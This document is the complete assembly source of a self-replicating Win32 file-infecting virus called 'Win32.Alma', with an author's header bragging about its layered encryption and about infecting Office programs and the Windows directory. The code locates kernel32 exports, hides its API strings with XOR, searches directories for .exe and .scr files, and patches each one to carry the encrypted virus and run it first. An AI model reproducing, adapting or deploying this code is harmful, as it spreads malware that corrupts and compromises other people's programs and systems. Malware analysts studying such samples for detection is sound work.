; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                              Ä< Win32.Alma >Ä
;                            Designed by LiteSys
;
; This is the second variant of a virus I wrote approximately three months
; ago,it was my second PE infector. The virus itself had nothing special
; beyond it's size: 37kb because it's payload used to drop an MP3, play it
; and drop a com file saying stupid things. It had 8-bits XOR encryption,
; direct action with backwards directory navigation and slow as hell,
; personally I think it was my worst virus so far.
;
; I decided to give a try on some stuff I learned and I thought that writing
; another virus would really be boring because I had to do things i've
; done before and that's obviously boring ;D. I thought about a variant and
; i chosen this virus. So I decided to strip the MP3 and the COM files and
; began giving it "a better life" (hoho).
;
; What can I say? this virus has three decryptors:
;
;    .--------------------.
;    |    DECRYPTOR #1    |--.
;    |--------------------|  |
; .->| CALL DECRYPTOR  #3 |  |
; |  |--------------------|  |
; |  |     VIRUS CODE     |  |
; |  |--------------------|  |
; `--|     DECRYPTOR #2   |<-'
;    `--------------------'
;
; DECRYPTOR #1: 8-bits SUB/ADD with variable sliding key.
; DECRYPTOR #2: 96-bits XOR/XOR + ADD/SUB + SUB/ADD decryptor.
; DECRYPTOR #3: 8-bits XOR with static key. Used to decrypt the data.
;
; Really I think this virus needs a poly engine and EPO features, but I
; don't have any time to code, so here it is, easily detectable =).
;
; By the way, this is my most stable virus =D. I tried to infect WinWord,
; Excel, PowerPoint and Outlook and everything went ok, also I infected
; everything I had in the Windows directory and it was ok too.
;
; Peace,
; LiteSys
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

.586p
.MODEL FLAT, STDCALL

INCLUDE C:\TOOLS\TASM\INCLUDE\WIN32API.INC
INCLUDE C:\TOOLS\TASM\INCLUDE\WINDOWS.INC

EXTRN ExitProcess:PROC
EXTRN MessageBoxA:PROC

.CONST

 PAGINAS                EQU     50d
 KERNEL_9X              EQU     0BFF70000h
 GPA_HARDCODE           EQU     0BFF76DACh
 CRLF                   EQU     <0Dh, 0Ah>
 TAMA¥O_VIRUS           EQU     (TERMINA_VIRUS - EMPIEZA_VIRUS)
 TAMA¥O_ENCRIPTADO      EQU     (TERMINA_VIRUS - EMPIEZA_CRYPT)
 TAMA¥O_DESENCRIPTOR    EQU     (EMPIEZA_CRYPT - EMPIEZA_VIRUS)
 RDTSC                  EQU     <DW 310Fh>

.DATA

 MENSJE         DB      "Alma Virus by LiteSys", CRLF
                DB      "Primera Generacion", CRLF, CRLF
                DB      "Tamanio total del virus: "
                DB      TAMA¥O_VIRUS / 10000 MOD 10 + 30h
                DB      TAMA¥O_VIRUS /  1000 MOD 10 + 30h
                DB      TAMA¥O_VIRUS /   100 MOD 10 + 30h
                DB      TAMA¥O_VIRUS /    10 MOD 10 + 30h
                DB      TAMA¥O_VIRUS /     1 MOD 10 + 30h
                DB      00h
 TITLO          DB      "-= Alma =-", 00h

.CODE

Alma:

  XOR EBP, EBP
  JMP EMPIEZA_CRYPT

  EMPIEZA_VIRUS         LABEL   NEAR

  CALL @LA_YUCA
  @ER_DERTA:
  SUB EDX, OFFSET @ER_DERTA
  JMP @EL_MONTE
  @LA_YUCA:
  POP EDX
  JMP @ER_DERTA
  @EL_MONTE:
  XCHG EDX, EBP

  MOV AL, 00h
  ORG $-1
  LLAVEX DB 00h
  MOV ECX, TAMA¥O_ENCRIPTADO
  LEA ESI, OFFSET [EBP + EMPIEZA_CRYPT]
  @@DC:
   ADD BYTE PTR [ESI], AL
   INC ESI
   DEC AL
  LOOP @@DC

  PUSH OFFSET EMPIEZA_CRYPT
  ADD DWORD PTR [ESP], EBP
  JMP @Decriptor_2

  EMPIEZA_CRYPT         LABEL   NEAR

  JMP @@1
   DB "  [ALMA]  "
  @@1:

  CALL Desencriptar_Datos

  MOV EDI, DWORD PTR [ESP]

  CALL Seh_Handler

  MOV ESP, DWORD PTR [ESP+8h]
  JMP _REVOL

  Seh_Handler:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  CALL BUSCA_KERNEL32
  MOV DWORD PTR [EBP + KERNEL32], EAX

  CALL BUSCA_GPA
  MOV DWORD PTR [EBP + GetProcAddress], EAX

  LEA EDI, OFFSET [EBP + Tabla_APIs_KERNEL32]
  LEA ESI, OFFSET [EBP + CreateFileA]
  CALL BUSCA_APIs
  INC EAX
  JZ _REVOL

  LEA EAX, OFFSET [EBP + DIR_ORIGINAL]
  PUSH EAX
  PUSH MAX_PATH
  CALL [EBP + GetCurrentDirectoryA]
  OR EAX, EAX
  JZ _REVOL

  Busca_Primero:

  LEA EAX, OFFSET [EBP + Busqueda]
  PUSH EAX
  LEA EAX, OFFSET [EBP + Todo]
  PUSH EAX
  CALL [EBP + FindFirstFileA]
  MOV DWORD PTR [EBP + SHandle], EAX
  INC EAX
  JZ Recupera_Directorio
  DEC EAX

  LaMamada:

  LEA EDI, OFFSET [EBP + Busqueda.wfd_szFileName]
  XOR EAX, EAX
  MOV AL, "."
  @@Z:
   SCASB
  JNZ @@Z
  MOV EAX, DWORD PTR [EDI-1h]
  OR EAX, 20202020h
  CMP EAX, "exe."
  JE Infecta_Este_Exe
  CMP EAX, "rcs."
  JE Infecta_Este_Exe

  Busca_Proximo:

  LEA EAX, OFFSET [EBP + Busqueda]
  PUSH EAX
  PUSH DWORD PTR [EBP + SHandle]
  CALL [EBP + FindNextFileA]
  OR EAX, EAX
  JNZ LaMamada

  PUSH DWORD PTR [EBP + SHandle]
  CALL [EBP + FindClose]

  LEA EAX, OFFSET [EBP + Puto_Puto]
  PUSH EAX
  CALL [EBP + SetCurrentDirectoryA]
  OR EAX, EAX
  JZ Recupera_Directorio
  
  LEA EAX, OFFSET [EBP + Busqueda.wfd_szFileName]
  PUSH EAX
  PUSH MAX_PATH
  CALL [EBP + GetCurrentDirectoryA]
  OR EAX, EAX
  JE Termina_Directa
  CMP DWORD PTR [EBP + Grueso], EAX
  JE Termina_Directa
  MOV DWORD PTR [EBP + Grueso], EAX

  JMP Busca_Primero

  Termina_Directa:

  CMP BYTE PTR [EBP + WinDir_Infectado], TRUE
  JZ Recupera_Directorio

  MOV BYTE PTR [EBP + WinDir_Infectado], TRUE
  PUSH MAX_PATH
  LEA EAX, OFFSET [EBP + Busqueda.wfd_szFileName]
  PUSH EAX
  CALL [EBP + GetWindowsDirectoryA]
  OR EAX, EAX
  JZ Recupera_Directorio

  LEA EAX, OFFSET [EBP + Busqueda.wfd_szFileName]
  PUSH EAX
  CALL [EBP + SetCurrentDirectoryA]

  JMP Busca_Primero
  
  Recupera_Directorio:

  LEA EAX, OFFSET [EBP + Dir_Original]
  CALL [EBP + SetCurrentDirectoryA]

  _REVOL:

  XOR EAX, EAX
  POP DWORD PTR FS:[EAX]
  POP ECX

  DB 068h                       ; PUSH
  RETORNA                       DD      OFFSET _PrimGen ; Primera Generacion
  RET

  Infecta_Este_Exe:
    LEA EBX, OFFSET [EBP + Busqueda.wfd_szFileName]
    CALL Infecta_Exe
    JMP Busca_Proximo

  Mi_Firma                      DB      "[" XOR 4Eh
                                DB      "D" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "g" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      " " XOR 4Eh
                                DB      "b" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      " " XOR 4Eh
                                DB      "L" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "S" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "]" XOR 4Eh
                                
  ; Proceso para buscar la base del KERNEL32
  ;
  ; EDI -> llamada del stack...

  BUSCA_KERNEL32        PROC

  AND EDI, 0FFFF0000h
  PUSH PAGINAS
  POP ECX

  CHEQUEA:
    PUSH EDI
    CMP BYTE PTR [EDI], "M"
    JNE SIGUE

    ADD EDI, [EDI+3Ch]
    CMP BYTE PTR [EDI], "P"
    JE MESMO

  SIGUE:
    POP EDI
    SUB EDI, 1000h
  LOOP CHEQUEA

  PUSH KERNEL_9X

  MESMO:
    POP EAX
    RET

  BUSCA_KERNEL32        ENDP

  ; Funcion para Encriptar/Desencriptar los datos.
  ; Llave estatica.

  Desencriptar_Datos:

  LEA EDI, OFFSET [EBP + CRIPTA2]
  MOV ECX, L_CRIPTA2
  @DCR:
   XOR BYTE PTR [EDI], 4Eh
   INC EDI
  LOOP @DCR

  RET

  ; Proceso para buscar el handle de GetProcAddress.
  ; Se debe buscar primero el handle del kernel32.

  BUSCA_GPA             PROC

  MOV EBX, DWORD PTR [EBP + KERNEL32]
  MOV ESI, EBX

  ADD ESI, DWORD PTR [ESI+3Ch]
  MOV ESI, DWORD PTR [ESI+78h]
  ADD ESI, EBX                              ; Obtiene tabla de exportaciones.
  MOV DWORD PTR [EBP + EXPORTS], ESI

  MOV ECX, DWORD PTR [ESI+18h]
  DEC ECX

  MOV ESI, DWORD PTR [ESI+20h]
  ADD ESI, EBX

  XOR EAX, EAX

  BUX:
    MOV EDI, DWORD PTR [ESI]
    ADD EDI, EBX
    PUSH ESI

    LEA ESI, OFFSET [EBP + GPA]

    COMP:
      PUSH ECX
      PUSH Largo_GPA
      POP ECX
      REP CMPSB
      JE GPA_LISTO

      POP ECX
      INC EAX
      POP ESI
      ADD ESI, 4h

      LOOP BUX

  JMP ASUME_HARDCODE

  GPA_LISTO:

    POP ESI
    POP ECX

    MOV EDI, DWORD PTR [EBP + EXPORTS]
    ADD EAX, EAX

    MOV ESI, DWORD PTR [EDI+24h]
    ADD ESI, EBX
    ADD ESI, EAX

    MOVZX EAX, WORD PTR [ESI]
    IMUL EAX, EAX, 4h

    MOV ESI, DWORD PTR [EDI+1Ch]
    ADD ESI, EBX
    ADD ESI, EAX

    MOV EAX, DWORD PTR [ESI]
    ADD EAX, EBX

    RET

  ASUME_HARDCODE:

    PUSH GPA_HARDCODE
    POP EAX
    RET

  BUSCA_GPA             ENDP

  ; Proceso para buscar el handle de cada una de las
  ; APIs.
  ;
  ; EBX -> Modulo.
  ; EDI -> Cadenas de las APIs.
  ; ESI -> DWords para guardar las rva.

  BUSCA_APIs            PROC

  PUSHAD

  B1:

  PUSH EDI
  PUSH EBX
  CALL [EBP + GetProcAddress]
  OR EAX, EAX
  JZ _ERROR_APIs

  MOV DWORD PTR [ESI], EAX
  ADD ESI, 4h

  XOR AL, AL
  REPNZ SCASB
  CMP BYTE PTR [EDI], 0FFh
  JNZ B1

  POPAD
  RET

  _ERROR_APIs:

  XOR EAX, EAX
  DEC EAX
  RET

  BUSCA_APIs            ENDP

  ; Proceso para infectar un archivo PE.
  ; Expande la ultima secci¢n del PE.
  ;
  ; EBX -> Puntero al archivo a infectar.

  INFECTA_EXE           PROC

  PUSHAD

  PUSH DWORD PTR [EBP + RETORNA]
  POP DWORD PTR [EBP + EP_VIEJO]
  
  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH OPEN_EXISTING
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  PUSH EBX
  CALL [EBP + CreateFileA]
  MOV DWORD PTR [EBP + FHANDLE], EAX
  INC EAX
  JZ _FIN_INFEXE
  DEC EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH EAX
  CALL [EBP + GetFileSize]
  MOV DWORD PTR [EBP + TAMA¥O], EAX
  INC EAX
  JZ _FIN_INFEXE
  DEC EAX
  ADD EAX, TAMA¥O_VIRUS+1000h

  PUSH EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH EAX
  PUSH EBX
  PUSH PAGE_READWRITE
  PUSH EBX
  PUSH DWORD PTR [EBP + FHANDLE]
  CALL [EBP + CreateFileMappingA]
  MOV DWORD PTR [EBP + MHANDLE], EAX
  OR EAX, EAX
  JZ _FIN_INFEXE

  POP EDX

  XOR EBX, EBX
  PUSH EDX
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_WRITE
  PUSH EAX
  CALL [EBP + MapViewOfFile]
  MOV DWORD PTR [EBP + BASEMAP], EAX
  OR EAX, EAX
  JZ _TERMINADA

  MOV EDI, EAX

  MOV BX, WORD PTR [EDI]
  XOR BX, 6666h
  SUB BX, 3C2Bh              ; "ZM" XOR 6666h & SUB
  JNZ _TERMINADA

  MOV EDX, EDI
  ADD EDX, DWORD PTR [EDI+3Ch]
  CMP EDX, DWORD PTR [EBP + BaseMap]
  JB _TERMINADA
  MOV EBX, DWORD PTR [EBP + BASEMAP]
  ADD EBX, DWORD PTR [EBP + TAMA¥O]
  CMP EDX, EBX
  JA _TERMINADA

  ADD EDI, DWORD PTR [EDI+3Ch]
  MOV BX, WORD PTR [EDI]
  XOR BX, 2121h
  SUB BX, 6471h              ; "EP" XOR 6666h & SUB
  JNZ _TERMINADA

  CMP DWORD PTR [EDI+4Ch], "amlA"        ; "Alma" marca de infeccion.
  JZ _TERMINADA

  MOV DWORD PTR [EDI+4Ch], "amlA"

  MOV ESI, EDI
  ADD ESI, 18h
  MOVZX EAX, WORD PTR [EDI+14h]
  ADD ESI, EAX

  XOR ECX, ECX
  MOVZX ECX, WORD PTR [EDI+06h]
  DEC ECX
  IMUL ECX, ECX, 28h                     ; ultima seccion
  ADD ESI, ECX

  PUSH DWORD PTR [ESI+10h]
  POP DWORD PTR [EBP + SRAWDATA]       ; sizeofrawdata.

  MOV EAX, DWORD PTR [ESI+8h]
  PUSH EAX
  ADD EAX, TAMA¥O_VIRUS                  ; ajustar
  MOV DWORD PTR [ESI+8h], EAX

  MOV EBX, DWORD PTR [EDI+3Ch]          ; alignment.
  XOR EDX, EDX
  DIV EBX

  INC EAX
  MUL EBX

  MOV DWORD PTR [ESI+10h], EAX          

  POP EBX

  MOV EAX, DWORD PTR [EDI+28h]
  ADD EAX, DWORD PTR [EDI+34h]
  MOV DWORD PTR [EBP + RETORNA], EAX

  ADD EBX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+28h], EBX

  OR DWORD PTR [ESI+24h], 0A0000020h             ; caracteristicas

  MOV EAX, DWORD PTR [ESI+10h]
  ADD EAX, DWORD PTR [ESI+0Ch]
  MOV DWORD PTR [EDI+50h], EAX                   ; ImageSize.

  ; copiar virus...

  MOV EDI, DWORD PTR [ESI+14h]
  ADD EDI, DWORD PTR [ESI+8h]
  PUSH TAMA¥O_VIRUS
  POP ECX
  SUB EDI, ECX
  ADD EDI, [EBP + BASEMAP]

  PUSH PAGE_READWRITE
  PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
  PUSH TAMA¥O_VIRUS + 100h
  PUSH NULL
  CALL [EBP + VirtualAlloc]
  MOV DWORD PTR [EBP + MEMORIA], EAX
  OR EAX, EAX
  JZ _TERMINADA

  PUSHAD

  MOV EDI, EAX
  LEA ESI, OFFSET [EBP + EMPIEZA_CRYPT]
  MOV ECX, (@Decriptor_2 - EMPIEZA_CRYPT) / 12

  RDTSC
  IMUL EAX, EAX
  NEG EAX
  MOV DWORD PTR [EBP + LLAVE2A], EAX
  PUSH EAX

  RDTSC
  ADC EAX, EAX
  NOT EAX
  MOV DWORD PTR [EBP + LLAVE2B], EAX
  PUSH EAX

  CALL [EBP + GetTickCount]
  IMUL EAX, EAX
  NOT EAX
  MOV DWORD PTR [EBP + LLAVE2C], EAX
  XCHG EDX, EAX

  POP EBX
  POP EAX

 ; LLAVE2A -> EAX
 ; LLAVE2B -> EBX
 ; LLAVE2C -> EDX

  PUSHAD
  CALL Desencriptar_Datos
  POPAD

  @JOJOJO:
   MOVSD
   MOVSD
   MOVSD
   XOR DWORD PTR [EDI-0Ch], EAX
   ADD DWORD PTR [EDI-08h], EBX
   SUB DWORD PTR [EDI-04h], EDX
  LOOP @JOJOJO

  PUSHAD
  CALL Desencriptar_Datos
  POPAD

  PUSH TAMA¥O_DEC2
  POP ECX
  REP MOVSB

  POPAD

  @ReGen:
  RDTSC
  IMUL EAX, EAX
  MOV BYTE PTR [EBP + LLAVEX], AL
  OR AL, AL
  JZ @ReGen

  LEA ESI, OFFSET [EBP + EMPIEZA_VIRUS]
  PUSH TAMA¥O_DESENCRIPTOR
  POP ECX
  REP MOVSB

  MOV ESI, DWORD PTR [EBP + MEMORIA]
  MOV ECX, TAMA¥O_ENCRIPTADO

  PUSHAD
  CALL Desencriptar_Datos
  POPAD

  @@CC:
    MOVSB
    SUB BYTE PTR [EDI-1h], AL
    DEC AL
  LOOP @@CC

  PUSHAD
  CALL Desencriptar_Datos
  POPAD

  ADD DWORD PTR [EBP + TAMA¥O], TAMA¥O_VIRUS+1000h

  _TERMINADA:

  PUSH DWORD PTR [EBP + BASEMAP]
  CALL [EBP + UnmapViewOfFile]

  PUSH DWORD PTR [EBP + MHANDLE]
  CALL [EBP + CloseHandle]

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  MOV EAX, DWORD PTR [EBP + TAMA¥O]
  PUSH EAX
  PUSH DWORD PTR [EBP + FHANDLE]
  CALL [EBP + SetFilePointer]

  PUSH DWORD PTR [EBP + FHANDLE]
  CALL [EBP + SetEndOfFile]

  PUSH DWORD PTR [EBP + FHANDLE]
  CALL [EBP + CloseHandle]

  _FIN_INFEXE:

  PUSH DWORD PTR [EBP + EP_VIEJO]
  POP DWORD PTR [EBP + RETORNA]
  
  POPAD
  RET

  INFECTA_EXE           ENDP

  CRIPTA2               LABEL   NEAR

  Kernel32                      DD      4E4E4E4Eh
  GetProcAddress                DD      4E4E4E4Eh
  Puto_Puto                     DB      "." XOR 4Eh
                                DB      "." XOR 4Eh
                                DB      4Eh
  Todo                          DB      "*" XOR 4Eh
                                DB      "." XOR 4Eh
                                DB      "?" XOR 4Eh
                                DB      "?" XOR 4Eh
                                DB      "?" XOR 4Eh
                                DB      4Eh
  SHandle                       DD      4E4E4E4Eh
  Grueso                        DD      4E4E4E4Eh
  Dir_Original                  DB      MAX_PATH DUP (4Eh)
  CreateFileA                   DD      4E4E4E4Eh
  CreateFileMappingA            DD      4E4E4E4Eh
  MapViewOfFile                 DD      4E4E4E4Eh
  UnmapViewOfFile               DD      4E4E4E4Eh
  CloseHandle                   DD      4E4E4E4Eh
  FindFirstFileA                DD      4E4E4E4Eh
  FindNextFileA                 DD      4E4E4E4Eh
  FindClose                     DD      4E4E4E4Eh
  GetFileSize                   DD      4E4E4E4Eh
  SetFilePointer                DD      4E4E4E4Eh
  SetEndOfFile                  DD      4E4E4E4Eh
  GetCurrentDirectoryA          DD      4E4E4E4Eh
  SetCurrentDirectoryA          DD      4E4E4E4Eh
  GetSystemTime                 DD      4E4E4E4Eh
  LoadLibraryA                  DD      4E4E4E4Eh
  VirtualAlloc                  DD      4E4E4E4Eh
  VirtualFree                   DD      4E4E4E4Eh
  GetTickCount                  DD      4E4E4E4Eh
  GetWindowsDirectoryA          DD      4E4E4E4Eh
  WinDir_Infectado              DB      4Eh
  MEMORIA                       DD      4E4E4E4Eh
  FHANDLE                       DD      4E4E4E4Eh
  MHANDLE                       DD      4E4E4E4Eh
  BASEMAP                       DD      4E4E4E4Eh
  TAMA¥O                        DD      4E4E4E4Eh
  SRAWDATA                      DD      4E4E4E4Eh
  EP_VIEJO                      DD      4E4E4E4Eh
  EXPORTS                       DD      4E4E4E4Eh
  GPA                           DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "P" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      4Eh
  Largo_GPA                     EQU     $-GPA
  Busqueda                      DB      SIZEOF_WIN32_FIND_DATA DUP (4Eh)

  Tabla_APIs_KERNEL32           DB      "C" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "C" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "M" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "p" XOR 4Eh
                                DB      "p" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "g" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "M" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "p" XOR 4Eh
                                DB      "V" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "w" XOR 4Eh
                                DB      "O" XOR 4Eh
                                DB      "f" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "U" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "m" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "p" XOR 4Eh
                                DB      "V" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "w" XOR 4Eh
                                DB      "O" XOR 4Eh
                                DB      "f" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "C" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "H" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "N" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "x" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "C" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "S" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "z" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "S" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "P" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      4Eh

                                DB      "S" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "E" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "O" XOR 4Eh
                                DB      "f" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "C" XOR 4Eh
                                DB      "u" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "D" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "S" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "C" XOR 4Eh
                                DB      "u" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "D" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "S" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "m" XOR 4Eh
                                DB      "T" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "m" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "L" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "L" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "b" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      "V" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "u" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      4Eh

                                DB      "V" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "u" XOR 4Eh
                                DB      "a" XOR 4Eh
                                DB      "l" XOR 4Eh
                                DB      "F" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      4Eh

                                DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "T" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      "k" XOR 4Eh
                                DB      "C" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "u" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      4Eh

                                DB      "G" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "W" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "n" XOR 4Eh
                                DB      "d" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "w" XOR 4Eh
                                DB      "s" XOR 4Eh
                                DB      "D" XOR 4Eh
                                DB      "i" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "e" XOR 4Eh
                                DB      "c" XOR 4Eh
                                DB      "t" XOR 4Eh
                                DB      "o" XOR 4Eh
                                DB      "r" XOR 4Eh
                                DB      "y" XOR 4Eh
                                DB      "A" XOR 4Eh
                                DB      4Eh

                                DB      0FFh XOR 4Eh     ; HO HO HO

